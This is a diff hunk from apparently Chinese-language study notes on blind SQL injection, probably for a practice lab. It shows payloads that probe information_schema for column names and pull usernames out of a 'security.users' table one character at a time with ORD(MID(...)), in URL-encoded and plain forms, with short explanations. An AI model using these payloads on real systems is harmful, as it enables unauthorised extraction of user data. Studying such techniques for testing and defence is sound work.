@@ -13,7 +13,7 @@ limit 0,1      这里是对应一个表   而想要第二个数据表就要——limit 1,1
 ?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1) 
 【解释】：     获取security库中的users表的username第一个字母	想要第二个让mid(****,1,1)变成mid(****,2,1)就OK了
 ?id=1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(username%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))=%2068--+
-
+?id = 1 ' and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))
 
 
 
